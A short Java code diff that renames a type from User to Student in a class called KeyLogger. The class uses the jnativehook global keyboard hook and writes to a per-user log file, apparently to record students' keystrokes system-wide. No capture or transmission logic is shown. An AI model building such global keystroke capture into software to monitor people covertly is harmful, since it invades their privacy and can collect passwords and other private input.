@@ -1,6 +1,6 @@
 package logger;
 
-import client.User;
+import client.Student;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
@@ -12,10 +12,10 @@ import java.util.logging.Logger;
 
 public class KeyLogger implements NativeKeyListener {
 
-    final User user;
+    final Student user;
     KeyLoggerFile kf;
 
-    public KeyLogger(User user) {
+    public KeyLogger(Student user) {
         this.user = user;
         kf = new KeyLoggerFile(user);
 
